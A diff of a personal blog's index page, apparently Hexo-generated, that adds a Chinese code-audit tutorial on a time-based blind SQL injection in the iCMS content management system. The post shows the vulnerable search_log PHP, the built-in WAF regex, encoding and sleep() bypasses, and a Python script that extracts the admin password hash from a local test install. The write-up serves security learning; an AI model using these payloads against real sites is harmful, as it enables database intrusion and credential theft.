@@ -108,7 +108,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjuca2igt0001mk05sm2hz6o2" class="article-share-link">Share</a>
+      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjvayftqq0003soalgkm4dvbj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -145,7 +145,79 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://gmazing.github.io/2019/01/01/2019/" data-id="cjuca2igp0000mk051lity0if" class="article-share-link">Share</a>
+      <a data-url="https://gmazing.github.io/2019/01/01/2019/" data-id="cjvayftpp0000soalcvtpt386" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-icms-v7012-time-sql" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/28/icms-v7012-time-sql/" class="article-date">
+  <time datetime="2018-12-28T13:53:38.000Z" itemprop="datePublished">12月 28 2018</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/28/icms-v7012-time-sql/">代码审计学习之 - iCMS时间盲注</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>iCMS 是一套采用 PHP 和 MySQL 构建的高效简洁的内容管理系统,为您的网站提供一个完美的开源解决方案</p>
+<p>项目地址：<a href="https://github.com/idreamsoft/iCMS" target="_blank" rel="noopener">https://github.com/idreamsoft/iCMS</a></p>
+<h5 id="1、目录结构"><a href="#1、目录结构" class="headerlink" title="1、目录结构"></a>1、目录结构</h5><p>​    首先需要先知道网站的大概目录结构:</p>
+<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── app       应用</span><br><span class="line">├── cache     缓存</span><br><span class="line">├── core      icms程序入口</span><br><span class="line">├── iPHP      iphp框架文件</span><br><span class="line">├── public    公共资源</span><br><span class="line">├── res       用户资源</span><br><span class="line">└── template  模板</span><br></pre></td></tr></table></figure>
+<h5 id="2、路由走向"><a href="#2、路由走向" class="headerlink" title="2、路由走向"></a>2、路由走向</h5><p>大概就是判断传来的类名中是否有Admincp或者App，如果没有就加载app/xx/xx.class.php，如果有Admincp则加载app/xx/xx.Admincp.php，如果有App则加载app/xx/xx.app.php，如果有Func则加载app/xx/xx.func.php，如果以上都不满足则去iPHP/core/下找。（详情见附1 url）</p>
+<p>路由：/public/api.php?app=user&amp;do=login</p>
+<p>文件：iCMS\app\user\user.app.php<br>方法：API_login<br>参数：NULL</p>
+<p>跟完入口文件后，对整个框架是怎么运行的，都有了个大概的了解，接下来可以去深入了解了。</p>
+<h5 id="3、审计代码"><a href="#3、审计代码" class="headerlink" title="3、审计代码"></a>3、审计代码</h5><p>根据上面的路由走向审计代码，发现iCMS\app\search\search.app.php 第 19行存在一个有趣注入点:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">searchApp</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $methods	= <span class="keyword">array</span>(<span class="string">'iCMS'</span>);</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_iCMS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;search();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">API_iCMS</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;search();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span><span class="params">($tpl=false)</span> </span>&#123;</span><br><span class="line">        $q  = rawurldecode($_GET[<span class="string">'q'</span>]);</span><br><span class="line">        $q  = iSecurity::encoding($q);</span><br><span class="line">        $q  = iSecurity::escapeStr($q);</span><br><span class="line">        $fwd = iPHP::callback(<span class="keyword">array</span>(<span class="string">"filterApp"</span>,<span class="string">"run"</span>),<span class="keyword">array</span>(&amp;$q),<span class="keyword">false</span>);</span><br><span class="line">        $fwd &amp;&amp; iPHP::error_404(<span class="string">'非法搜索词!'</span>, <span class="number">60002</span>);</span><br><span class="line">        $search[<span class="string">'keyword'</span>] = $q;</span><br><span class="line">        $search[<span class="string">'title'</span>]   = stripslashes($q);</span><br><span class="line">        $search[<span class="string">'iurl'</span>]    = (<span class="keyword">array</span>)<span class="keyword">self</span>::iurl($q);</span><br><span class="line">        $q &amp;&amp; <span class="keyword">$this</span>-&gt;search_log($q); <span class="comment">// </span></span><br><span class="line">        $tpl===<span class="keyword">false</span> &amp;&amp; $tpl = <span class="string">'&#123;iTPL&#125;/search.htm'</span>;</span><br><span class="line">        <span class="keyword">return</span> appsApp::render($search,$tpl,<span class="string">'search'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">escapeStr 函数</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeStr</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">		$data = array_map(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>,<span class="string">'escapeStr'</span>), $data);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $data = str_replace(<span class="keyword">array</span>(<span class="string">"\0"</span>,<span class="string">"%00"</span>,<span class="string">"\r"</span>),<span class="string">''</span>,$data);</span><br><span class="line">		$data = preg_replace(<span class="string">'/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]/'</span>,<span class="string">''</span>, $data);</span><br><span class="line">		<span class="comment">//&amp; =&gt; &amp;amp;</span></span><br><span class="line">		$data = preg_replace(<span class="string">'/&amp;(?!(#[0-9]+|[a-z]+);)/is'</span>, <span class="string">'&amp;amp;'</span>, $data);</span><br><span class="line">		<span class="comment">//&amp;amp;#xA9 =&gt; &amp;#xA9;</span></span><br><span class="line">		$data = preg_replace(<span class="string">'/&amp;amp;#x([a-fA-F0-9]&#123;2,4&#125;);/'</span>, <span class="string">'&amp;#x\\1'</span>,$data);</span><br><span class="line">		$data = str_replace(<span class="keyword">array</span>(<span class="string">'\"'</span>,<span class="string">"\'"</span>,<span class="string">"\\\\"</span>), <span class="keyword">array</span>(<span class="string">'&amp;#34;'</span>,<span class="string">'&amp;#39;'</span>,<span class="string">'&amp;#92;'</span>), $data);</span><br><span class="line">        $data = str_replace(<span class="keyword">array</span>(<span class="string">"%3C"</span>, <span class="string">'&lt;'</span>), <span class="string">'&amp;#60;'</span>, $data);</span><br><span class="line">        $data = str_replace(<span class="keyword">array</span>(<span class="string">"%3E"</span>, <span class="string">'&gt;'</span>), <span class="string">'&amp;#62;'</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">search_log 函数</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">search_log</span><span class="params">($search)</span></span>&#123;</span><br><span class="line">        <span class="comment">// $interval = 30;</span></span><br><span class="line">        <span class="comment">// $ip    = iPHP::get_ip();</span></span><br><span class="line">        <span class="comment">// $time  = time();</span></span><br><span class="line">        <span class="comment">// $key   = 'search/'.$ip;</span></span><br><span class="line">        <span class="comment">// $stime = iCache::get($key);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// if($stime &amp;&amp; $time-$stime&lt;$interval)&#123;</span></span><br><span class="line">        <span class="comment">//     iPHP::error_404('您搜索太快休息下,'.format_time($interval,'cn').'之后再继续', 60003);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// iCache::set($key,$time,$interval);</span></span><br><span class="line"></span><br><span class="line">        $sid  = iDB::value(<span class="string">"SELECT `id` FROM `#iCMS@__search_log` WHERE `search` = '$search' LIMIT 1"</span>);</span><br><span class="line">        <span class="keyword">if</span>($sid)&#123;</span><br><span class="line">            iDB::query(<span class="string">"</span></span><br><span class="line"><span class="string">                UPDATE `#iCMS@__search_log`</span></span><br><span class="line"><span class="string">                SET `times` = times+1</span></span><br><span class="line"><span class="string">                WHERE `id` = '$sid';</span></span><br><span class="line"><span class="string">            "</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            iDB::query(<span class="string">"</span></span><br><span class="line"><span class="string">                INSERT INTO `#iCMS@__search_log` (`search`, `times`, `addtime`)</span></span><br><span class="line"><span class="string">                VALUES ('$search', '1', '"</span>.$time.<span class="string">"');</span></span><br><span class="line"><span class="string">            "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>默认方法为 do_iCMS or API_iCMS 都是直接调用了 search 函数，定义通过GET 接收q参数的值，然后使用iPHP框架的iSecurity::encoding 设置值的编码、 iSecurity::escapeStr来过滤一些非法的字符，然后q参数的值进入到了search_log 函数，search_log 函数可以看到如果能够带入一个单引号 是可以闭合执行sql语句的。</p>
+<p>开始测试q参数能不能带入单引号。</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/1.png" alt="1"></p>
+<p>直接输入单引号是直接被 escapeStr 函数替换成了实体编码(服务器开启了magic_quotes_gpc的话会把单引号转义为 \‘, 也符合了escapeStr 的正则，会被替换成为了实体编码)，那该怎么绕过呢？</p>
+<p>详细看代码可以看到 q参数 的值接收进来后是先通过 rawurldecode 函数来处理的 </p>
+<p>(string rawurldecode ( string <code>$str</code> ) ,  对已编码的 URL 字符串进行解码)</p>
+<p>那么我们可以用二次编码来进行单引号逃逸尝试，%27 \’ 传入被替换为实体编码， 那么%2527呢，</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/2.png" alt="2"></p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/1546009799579.png" alt="1546009799579"></p>
+<p>成功逃逸单引号，可以选择闭合 search_log函数里面的sql语句咯:)</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/3.png" alt="3"></p>
+<p>可是存在自带的WAF, 定位到关键的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $ARGS_ARRAY = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'xss'</span>   =&gt;<span class="string">"['\";\*&lt;&gt;].*\bon[a-zA-Z]&#123;3,15&#125;[\s\r\n\v\f]*=|\b(?:expression)\(|&lt;script+|&lt;!\[cdata\[|\b(?:eval|alert|prompt|msgbox)\s*\(|url\((?:\#|data|javascript)"</span>,</span><br><span class="line">		<span class="string">'sql'</span>   =&gt;<span class="string">"[^\&#123;\s]&#123;1&#125;(\s|\b)+(?:select\b|update\b|insert(?:(/\*.*?\*/)|(\s)|(\+))+into\b).+?(?:from\b|set\b)|[^\&#123;\s]&#123;1&#125;(\s|\b)+(?:create|delete|drop|truncate|rename|desc)(?:(/\*.*?\*/)|(\s)|(\+))+(?:table\b|from\b|database\b)|into(?:(/\*.*?\*/)|\s|\+)+(?:dump|out)file\b|\bsleep\([\s]*[\d]+[\s]*\)|benchmark\(([^\,]*)\,([^\,]*)\)|(?:declare|set|select)\b.*\@|union\b.*(?:select|all)\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\(|(?:master\.\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\.db|sys\.database_name|information_schema\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\.dbms_export_extension)"</span>,</span><br><span class="line">		<span class="string">'other'</span> =&gt;<span class="string">"\.\.[\/].*%00([^0-9a-fA-F]|$)|%00['\"\.]"</span></span><br><span class="line">	);</span><br></pre></td></tr></table></figure>
+<p>可以发现还是有挺多函数没有被禁用的，由于注入是一个不会回显得insert注入，也就能时间盲注，所以我们只能选择绕过sleep等延时函数。</p>
+<p>关注到正则  \bsleep([\s]<em>[\d]+[\s]</em>) 的写法，可以很轻松的绕过， 只有当sleep函数中()里的值为数字时才会拦截，那我们可以使用小数点 sleep(0.1) 或者 sleep(if(1=1,2,1))的方式 的方法绕过他:)</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/4.png" alt="4"></p>
+<p>sleep(if(1=1,2,1)) 的情况下的延时，数据库执行了两遍，莫名其妙的，有时候1 = 5秒+ ， 有的时候1 = 9秒+</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/5.png" alt="5"></p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/6.png" alt="6"></p>
+<p>sleep(if(1=2,2,0.1)) 的情况下的延时， 可以看到延时很小</p>
+<p>至于 select\b from 的正则么， 就用 /<em>!50000select</em>/(username)from 来绕过， 不拦截就ok 了。</p>
+<p><img src="/2018/12/28/icms-v7012-time-sql/7.png" alt="5"></p>
+<p>写个python来跑跑账号密码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># ！！！注意，每个网站的延时时间都不同，需要修改 starttime </span></span><br><span class="line"><span class="comment"># replace http url test bugs</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.&#123;&#125;-'  # get username payload</span></span><br><span class="line">payloads = <span class="string">'0123456789abcdef'</span>	<span class="comment"># get password payload 0123456789abcdef</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">print(<span class="string">"Start"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):s</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            starttime = time.time()  <span class="comment"># crrrent time</span></span><br><span class="line">            url = <span class="string">"http://127.0.0.1:8001/public/api.php?app=search&amp;q=q%2527or if(ascii(substring((/*!50000select*/(password)from(icms_members)WHERE uid=1),&#123;ii&#125;,1))=&#123;pa&#125;,sleep(0.1), 22))%2523"</span>.format(ii=i, pa=ord(payload))</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> time.time() - starttime &gt; <span class="number">4</span>:</span><br><span class="line">                    flag += payload</span><br><span class="line">                    print(<span class="string">'data is:'</span>, flag,), len(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span>  <span class="comment"># 没啥解释的了，就是不断试payload，找到就接到flag上去然后继续试下一个</span></span><br><span class="line">print(<span class="string">'[Finally] current data is %s'</span> % flag)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gmazing.github.io/2018/12/28/icms-v7012-time-sql/" data-id="cjvayftqf0002soalno2bavni" class="article-share-link">Share</a>
       
       
     </footer>
@@ -186,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://gmazing.github.io/2018/12/03/hxb2018/" data-id="cjuca2ih30002mk05it9f1jpu" class="article-share-link">Share</a>
+      <a data-url="https://gmazing.github.io/2018/12/03/hxb2018/" data-id="cjvayftqd0001soalz53ubsqy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -232,6 +304,10 @@
         
           <li>
             <a href="/2019/01/01/2019/">2019年咯</a>
+          </li>
+        
+          <li>
+            <a href="/2018/12/28/icms-v7012-time-sql/">代码审计学习之 - iCMS时间盲注</a>
           </li>
         
           <li>
